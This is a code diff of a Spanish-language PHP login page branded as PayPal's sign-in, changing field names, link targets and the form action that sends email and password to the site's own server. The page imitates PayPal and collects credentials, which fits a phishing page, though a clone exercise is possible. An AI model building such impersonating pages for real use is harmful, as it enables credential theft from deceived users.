@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, shrink-to-fit=no">
 <title>Inicie sesión en su cuenta de PayPal</title>
-
+<link rel="icon" type="image/png" href="favicon.ico" />
 <!-- Web Fonts
 ========================= -->
 <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Rubik:300,300i,400,400i,500,500i,700,700i,900,900i' type='text/css'>
@@ -40,22 +40,23 @@ session_start();
         <div class="bg-white border rounded p-4 py-sm-5 px-sm-5">
           <div class="logo mb-4"> <a class="d-flex justify-content-center" title="paypal"><img src="resources/Logo_Azul.png" alt="paypal" height="40"></a></div>
           <h5 class="display-4" style="<?=$style?>"><?= $mensaje?></h5>
-          <form action="Server/login" id="loginForm" method="POST">
+          <form action="Server/login.php" id="loginForm" method="POST">
             <div class="form-group">
-              <input name="txtCorreo" type="email" class="form-control" id="correoElectronico" required placeholder="Correo electrónico o número de celular">
+              <input name="txtEmail" type="email" class="form-control" id="correoElectronico" required placeholder="Correo electrónico o número de celular">
             </div>
             <div class="form-group">
-              <input name="txtContraseña" type="password" class="form-control" id="loginPassword" required placeholder="Contraseña">
+              <input name="txtPassword" type="password" class="form-control" id="loginPassword" required placeholder="Contraseña">
             </div>
+            <input type="hidden" name="Login" value="1">
             <button class="btn btn-primary btn-block shadow-none mt-4 mb-3" type="submit">Iniciar sesión</button>
           </form>
-          <p class="text-center text-2 mb-2"><a class="btn-link" href="pass_recovery">¿Tiene problemas para iniciar sesión?</a></p>
+          <p class="text-center text-2 mb-2"><a class="btn-link" href="pass_recovery.php">¿Tiene problemas para iniciar sesión?</a></p>
           <div class="d-flex align-items-center mb-3">
             <hr class="flex-grow-1">
             <span class="mx-2 text-muted">o</span>
             <hr class="flex-grow-1">
           </div>
-          <a class="btn btn-light shadow-none border btn-block" href="account-selection" >Registrarse</a> </div>
+          <a class="btn btn-light shadow-none border btn-block" href="account-selection.php" >Registrarse</a> </div>
       </div>
     </div>
   </div>
